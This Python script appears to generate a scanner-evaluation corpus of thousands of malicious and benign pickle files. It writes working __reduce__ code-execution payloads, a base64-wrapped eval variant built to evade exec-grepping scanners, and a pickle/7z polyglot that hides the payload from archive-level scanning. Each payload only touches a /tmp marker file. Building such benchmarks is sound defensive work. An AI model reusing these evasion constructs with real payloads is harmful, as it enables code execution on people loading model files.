#!/usr/bin/env python3
"""
gen_corpus.py  —  Phase 2: Corpus Generator

Generates a seeded, reproducible set of pickle files (and one safetensors
negative-control) for pickle-scanner mismatch evaluation.

Writes to:
    corpus/malicious/   — malicious pickle variants
    corpus/benign/      — benign pickles + safetensors control
    results/manifest.json — dict keyed by str id (O(1) lookup for later stages)

SEED: 42  (fixed; change here AND in README)
ASSUMPTION: CWD is /harness (the container WORKDIR); all paths are relative.
ASSUMPTION: /tmp/ is writable inside the container (payload marker target).
"""

import base64
import hashlib
import io
import json
import os
import pathlib
import pickle
import pickletools
import random
import tempfile
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

# ── Constants ─────────────────────────────────────────────────────────────────
SEED = 42  # fixed for reproducibility

CORPUS_DIR    = pathlib.Path("corpus")
RESULTS_DIR   = pathlib.Path("results")
MANIFEST_PATH = RESULTS_DIR / "manifest.json"

# Corpus counts (scaled for 5 000-malicious-payload IEEE evaluation)
# 2 500 reduce_basic + 1 250 nullifai_7z + 1 250 loadpath_trick = 5 000 malicious
# 2 499 benign pickle + 1 safetensors_control                   = 2 500 benign
# Grand total: 7 500 files
N_REDUCE_BASIC   = 2500
N_NULLIFAI_7Z    = 1250
N_LOADPATH_TRICK = 1250
N_BENIGN         = 2499
# safetensors_control is always exactly 1

# Parallel file-write workers — tune down on machines with < 4 cores
N_WRITE_WORKERS = 16

# Variant enum — these exact strings are used everywhere; do NOT rename
V_REDUCE_BASIC   = "reduce_basic"
V_NULLIFAI_7Z    = "nullifai_7z"
V_LOADPATH_TRICK = "loadpath_trick"
V_BENIGN         = "benign"
V_SAFETENSORS    = "safetensors_control"

# Callable strings recorded in manifest for paper methodology section
# These are the exact GLOBAL opcode references baked into each pickle stream.
CALLABLE_REDUCE   = "builtins.exec"   # GLOBAL opcode: cbuiltins\nexec\n
CALLABLE_LOADPATH = "builtins.eval"   # GLOBAL opcode: cbuiltins\neval\n (exec hidden inside base64)


# ── Payload classes (used at dump-time only; NOT imported at load-time) ───────
#
# When pickle.dumps(instance) is called, Python invokes __reduce__(), which
# returns (callable, args).  The pickle stream stores ONLY the global reference
# to that callable (e.g., builtins.exec) plus the literal args tuple.
# The payload class itself is NEVER serialised — it is only a dump-time helper.

class _ReduceBasicPayload:
    """
    Classic __reduce__ payload.
    Pickle GLOBAL opcode references: builtins  exec
    Pattern: direct exec() of a one-liner string.
    """
    def __init__(self, marker: str) -> None:
        self._marker = marker

    def __reduce__(self):
        code = f"open('{self._marker}', 'w').close()"
        return (exec, (code,))


class _LoadpathTrickPayload:
    """
    Indirect evasion: exec is hidden inside eval(base64-decode(...)).
    Pickle GLOBAL opcode references: builtins  eval  (NOT builtins  exec)

    Scanners that grep only for 'exec' in GLOBAL opcodes will miss this.

    Why 'loadpath_trick': analogous to real malware that prepends a sys.path
    manipulation to import a dropped payload — here the 'path' goes through
    base64 → eval → __import__('builtins').exec, avoiding a literal GLOBAL
    reference to exec.

    The encoded code string is computed at dump-time and baked into the pickle
    as a literal string argument; no encoding happens at load-time except the
    b64decode inside the eval string.
    """
    def __init__(self, marker: str) -> None:
        self._marker = marker

    def __reduce__(self):
        code    = f"open('{self._marker}', 'w').close()"
        encoded = base64.b64encode(code.encode()).decode()  # computed at dump-time
        # At load-time: eval(this string) → calls exec via __import__, not GLOBAL
        indirect = (
            f"__import__('builtins').exec("
            f"__import__('base64').b64decode(b'{encoded}').decode())"
        )
        return (eval, (indirect,))


# ── File-byte builders ────────────────────────────────────────────────────────

def _make_reduce_basic(marker: str) -> bytes:
    return pickle.dumps(_ReduceBasicPayload(marker), protocol=4)


def _make_loadpath_trick(marker: str) -> bytes:
    return pickle.dumps(_LoadpathTrickPayload(marker), protocol=4)


def _build_7z_archive_cache() -> bytes:
    """
    Build ONE benign 7z archive and return its raw bytes for reuse.

    PERFORMANCE KEY: Called exactly once in main().  All N_NULLIFAI_7Z polyglot
    files share the same archive_bytes — only the malicious pickle prefix and
    the random 48-byte tail differ between files.  Without this cache, py7zr
    would be invoked 1 250 times (~20-30 min total).

    The security property is preserved: the inner archive always contains a
    benign pickle, so a scanner that parses only the 7z layer sees no threat.
    """
    import py7zr  # lazy import: other stages don't need py7zr

    benign_inner = pickle.dumps(
        {"safe": True, "source": "nullifai_inner_cache", "values": list(range(16))},
        protocol=4,
    )
    with tempfile.NamedTemporaryFile(suffix=".pkl", delete=False) as tmp_inner:
        tmp_inner.write(benign_inner)
        inner_path = tmp_inner.name

    arch_fd, arch_path = tempfile.mkstemp(suffix=".7z")
    os.close(arch_fd)
    try:
        with py7zr.SevenZipFile(arch_path, mode="w") as zf:
            zf.write(inner_path, arcname="data.pkl")  # arcname confirmed from docs
        archive_bytes = pathlib.Path(arch_path).read_bytes()
    finally:
        os.unlink(inner_path)
        if pathlib.Path(arch_path).exists():
            os.unlink(arch_path)
    return archive_bytes


def _make_nullifai_7z_fast(
    marker: str, rng: random.Random, archive_cache: bytes
) -> bytes:
    """
    Construct a polyglot file using pre-built cached 7z archive bytes.

    Layout:   [malicious pickle bytes] + [7z archive bytes] + [corrupted tail]

    •  pickle.load(f) reads the malicious pickle first, hits the STOP opcode,
       executes the payload, and silently ignores trailing bytes.
    •  A scanner treating the file as a 7z archive extracts only the BENIGN
       inner pickle — sees nothing malicious, reports clean.
    •  Only the malicious pickle prefix (unique marker) and the 48-byte random
       tail vary per file.  The 7z body is identical across all nullifai_7z files.
    """
    malicious_bytes = _make_reduce_basic(marker)
    tail = bytes(rng.randint(0, 255) for _ in range(48))
    return malicious_bytes + archive_cache + tail


def _parallel_write(
    jobs: list[tuple[pathlib.Path, bytes]], n_workers: int
) -> None:
    """
    Write (path, data) pairs to disk using a thread pool.

    File I/O is the bottleneck for large corpora; threading is appropriate
    because CPython releases the GIL during syscall-based write() operations.
    All byte content is pre-generated in the main thread to preserve
    deterministic RNG ordering before any parallel work begins.
    """
    def _write_one(job: tuple[pathlib.Path, bytes]) -> None:
        path, data = job
        path.write_bytes(data)

    with ThreadPoolExecutor(max_workers=n_workers) as pool:
        futures = [pool.submit(_write_one, j) for j in jobs]
        for f in as_completed(futures):
            exc = f.exception()
            if exc:
                print(f"[gen_corpus] WARNING: write failed — {exc}")


def _make_benign(idx: int, rng: random.Random) -> bytes:
    """
    Legitimate pickle with no callables and no GLOBAL opcodes.
    Content varies across the corpus (dict / list / str), chosen by rng
    so the variation is deterministic and reproducible.
    """
    choice = rng.randint(0, 2)
    if choice == 0:
        obj = {
            "id":      idx,
            "label":   f"item_{idx:03d}",
            "weights": [round(rng.random(), 6) for _ in range(8)],
        }
    elif choice == 1:
        obj = [f"tok_{rng.randint(1000, 9999)}" for _ in range(12)]
    else:
        obj = f"benign_string_payload_idx_{idx:03d}_seed_{SEED}"
    return pickle.dumps(obj, protocol=4)


# ── Corpus sha256 (deterministic, sorted by id) ───────────────────────────────

def _corpus_sha256(manifest: dict) -> str:
    """
    Hash all corpus file bytes in sorted id order.
    Keys starting with '_' are meta-entries, not files — skip them.
    """
    h = hashlib.sha256()
    for fid in sorted(k for k in manifest if not k.startswith("_")):
        p = pathlib.Path(manifest[fid]["path"])
        if p.exists():
            h.update(p.read_bytes())
        else:
            print(f"[gen_corpus] WARNING: {p} missing — excluded from sha256")
    return h.hexdigest()


# ── safetensors control (isolated to its own function for clarity) ────────────

def _write_safetensors_control(ben_dir: pathlib.Path, manifest: dict) -> None:
    """
    Write one .safetensors file as a non-pickle negative control.
    Uses safetensors.numpy.save_file(tensors, filename) — confirmed from docs.
    numpy is added to requirements.txt (implicit dep of safetensors[numpy]).
    """
    fid   = "safetensors_ctrl_001"
    fpath = ben_dir / f"{fid}.safetensors"
    try:
        import numpy as np
        from safetensors.numpy import save_file as st_save
        arrays = {
            "weight": np.zeros((4, 4), dtype=np.float32),
            "bias":   np.zeros((4,),   dtype=np.float32),
        }
        st_save(arrays, str(fpath))
        manifest[fid] = {
            "id":                 fid,
            "path":               fpath.as_posix(),
            "is_malicious":       False,
            "variant":            V_SAFETENSORS,
            "callable_used":      None,
            "marker":             None,
            "expected_execution": False,
        }
        print(f"[gen_corpus] safetensors control written: {fpath}")
    except ImportError as exc:
        # Non-fatal: safetensors or numpy not installed; control row is omitted.
        print(f"[gen_corpus] WARNING: cannot write safetensors control — {exc}")
        print(f"[gen_corpus]          Is numpy installed?  pip install numpy")


# ── Pickle syntax verifier (uses pickletools, no execution) ───────────────────

def _verify_pickle_syntax(manifest: dict, sample_size: int = 20) -> None:
    """
    Spot-check a deterministic sample of reduce_basic + loadpath_trick pickles.

    For a 7 500-file corpus, checking every file sequentially would add ~15 s;
    a 20-file sample (first 10 + last 10) catches generation regressions with
    negligible overhead.

    Skipped variants:
      - nullifai_7z        → trailing archive bytes cause pickletools to raise past STOP
      - safetensors_control → not a pickle
      - benign             → we trust stdlib pickle.dumps; redundant to verify
    """
    skip = {V_NULLIFAI_7Z, V_SAFETENSORS, V_BENIGN}
    candidates = [
        (fid, entry)
        for fid, entry in manifest.items()
        if not fid.startswith("_") and entry["variant"] not in skip
    ]
    half   = sample_size // 2
    sample = candidates[:half] + candidates[-half:]

    errors = 0
    for fid, entry in sample:
        try:
            raw = pathlib.Path(entry["path"]).read_bytes()
            pickletools.dis(io.BytesIO(raw), out=io.StringIO())
        except Exception as exc:
            print(f"[gen_corpus] WARN pickle syntax {fid}: {exc}")
            errors += 1
    status = "PASS" if errors == 0 else f"{errors} error(s)"
    print(
        f"[gen_corpus] Pickle syntax spot-check "
        f"(sample={len(sample)}/{len(candidates)}): {status}"
    )


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    t_start = time.monotonic()
    rng = random.Random(SEED)  # isolated RNG — no global state mutation

    mal_dir = CORPUS_DIR / "malicious"
    ben_dir = CORPUS_DIR / "benign"
    mal_dir.mkdir(parents=True, exist_ok=True)
    ben_dir.mkdir(parents=True, exist_ok=True)
    RESULTS_DIR.mkdir(parents=True, exist_ok=True)

    manifest: dict = {}  # keyed by str id → O(1) downstream lookup

    # ── PERFORMANCE: Build 7z archive cache ONCE ──────────────────────────────
    # All N_NULLIFAI_7Z polyglot files share the same inner archive bytes.
    # Only the malicious pickle prefix and random tail differ per file.
    print(
        f"[gen_corpus] Building 7z archive cache "
        f"(once for all {N_NULLIFAI_7Z} {V_NULLIFAI_7Z} files) …"
    )
    t_7z = time.monotonic()
    archive_cache = _build_7z_archive_cache()
    print(
        f"[gen_corpus] 7z cache ready: {len(archive_cache):,} bytes "
        f"({time.monotonic() - t_7z:.2f}s)"
    )

    # ── Phase 1: Generate all file bytes in memory (sequential, deterministic) ─
    # Byte generation is fast (pickle.dumps); disk writes happen in parallel.
    total_files = N_REDUCE_BASIC + N_NULLIFAI_7Z + N_LOADPATH_TRICK + N_BENIGN + 1
    print(f"[gen_corpus] Generating byte payloads for {total_files} files …")
    t_gen = time.monotonic()
    write_jobs: list[tuple[pathlib.Path, bytes]] = []

    # 1. reduce_basic ─────────────────────────────────────────────────────────
    for i in range(1, N_REDUCE_BASIC + 1):
        fid    = f"mal_reduce_{i:04d}"
        marker = f"/tmp/pwned_{fid}"
        fpath  = mal_dir / f"{fid}.pkl"
        write_jobs.append((fpath, _make_reduce_basic(marker)))
        manifest[fid] = {
            "id":                 fid,
            "path":               fpath.as_posix(),
            "is_malicious":       True,
            "variant":            V_REDUCE_BASIC,
            "callable_used":      CALLABLE_REDUCE,
            "marker":             marker,
            "expected_execution": True,
        }

    # 2. nullifai_7z (uses archive_cache — O(1) per file) ─────────────────────
    for i in range(1, N_NULLIFAI_7Z + 1):
        fid    = f"mal_nullifai_{i:04d}"
        marker = f"/tmp/pwned_{fid}"
        fpath  = mal_dir / f"{fid}.pkl"
        write_jobs.append((fpath, _make_nullifai_7z_fast(marker, rng, archive_cache)))
        manifest[fid] = {
            "id":                 fid,
            "path":               fpath.as_posix(),
            "is_malicious":       True,
            "variant":            V_NULLIFAI_7Z,
            "callable_used":      CALLABLE_REDUCE,  # malicious prefix built by _make_reduce_basic
            "marker":             marker,
            "expected_execution": True,
        }

    # 3. loadpath_trick ───────────────────────────────────────────────────────
    for i in range(1, N_LOADPATH_TRICK + 1):
        fid    = f"mal_loadpath_{i:04d}"
        marker = f"/tmp/pwned_{fid}"
        fpath  = mal_dir / f"{fid}.pkl"
        write_jobs.append((fpath, _make_loadpath_trick(marker)))
        manifest[fid] = {
            "id":                 fid,
            "path":               fpath.as_posix(),
            "is_malicious":       True,
            "variant":            V_LOADPATH_TRICK,
            "callable_used":      CALLABLE_LOADPATH,  # exec hidden behind base64; GLOBAL=eval
            "marker":             marker,
            "expected_execution": True,
        }

    # 4. benign ───────────────────────────────────────────────────────────────
    for i in range(1, N_BENIGN + 1):
        fid   = f"benign_{i:04d}"
        fpath = ben_dir / f"{fid}.pkl"
        write_jobs.append((fpath, _make_benign(i, rng)))
        manifest[fid] = {
            "id":                 fid,
            "path":               fpath.as_posix(),
            "is_malicious":       False,
            "variant":            V_BENIGN,
            "callable_used":      None,
            "marker":             None,
            "expected_execution": False,
        }

    print(
        f"[gen_corpus] Byte generation done "
        f"({len(write_jobs)} files, {time.monotonic() - t_gen:.2f}s)"
    )

    # ── Phase 2: Write all files to disk in parallel ──────────────────────────
    total_mib = sum(len(d) for _, d in write_jobs) / 1_048_576
    print(
        f"[gen_corpus] Writing {len(write_jobs)} files to disk "
        f"({total_mib:.1f} MiB, {N_WRITE_WORKERS} workers) …"
    )
    t_write = time.monotonic()
    _parallel_write(write_jobs, N_WRITE_WORKERS)
    print(f"[gen_corpus] Disk writes done ({time.monotonic() - t_write:.2f}s)")

    # ── Phase 3: safetensors control (writes its own file synchronously) ──────
    print("[gen_corpus] Generating safetensors control …")
    _write_safetensors_control(ben_dir, manifest)

    # ── Write manifest.json ───────────────────────────────────────────────────
    print("[gen_corpus] Computing corpus SHA-256 …")
    t_sha = time.monotonic()
    corpus_sha = _corpus_sha256(manifest)
    print(f"[gen_corpus] SHA-256 done ({time.monotonic() - t_sha:.2f}s)")

    n_mal = sum(1 for v in manifest.values() if v.get("is_malicious"))
    n_ben = len(manifest) - n_mal

    # _meta is a reserved key (starts with '_'); downstream stages must skip it
    full_manifest = {
        "_meta": {
            "seed":           SEED,
            "corpus_sha256":  corpus_sha,
            "total_files":    len(manifest),
            "n_malicious":    n_mal,
            "n_benign":       n_ben,
            "variants": {
                V_REDUCE_BASIC:   N_REDUCE_BASIC,
                V_NULLIFAI_7Z:    N_NULLIFAI_7Z,
                V_LOADPATH_TRICK: N_LOADPATH_TRICK,
                V_BENIGN:         N_BENIGN,
                V_SAFETENSORS:    1,
            },
        },
        **manifest,
    }
    MANIFEST_PATH.write_text(json.dumps(full_manifest, indent=2))

    # ── Summary ───────────────────────────────────────────────────────────────
    elapsed = time.monotonic() - t_start
    print()
    print(f"[gen_corpus] ── Corpus complete ──────────────────────────────────")
    print(f"[gen_corpus]  Total files  : {len(manifest)}")
    print(f"[gen_corpus]  Malicious    : {n_mal}")
    print(f"[gen_corpus]  Benign       : {n_ben}")
    print(f"[gen_corpus]  Corpus sha256: {corpus_sha}")
    print(f"[gen_corpus]  Manifest     : {MANIFEST_PATH}")
    print(f"[gen_corpus]  Seed         : {SEED}")
    print(f"[gen_corpus]  Wall time    : {elapsed:.1f}s")
    print(f"[gen_corpus] ─────────────────────────────────────────────────────")

    _verify_pickle_syntax(manifest)


if __name__ == "__main__":
    main()
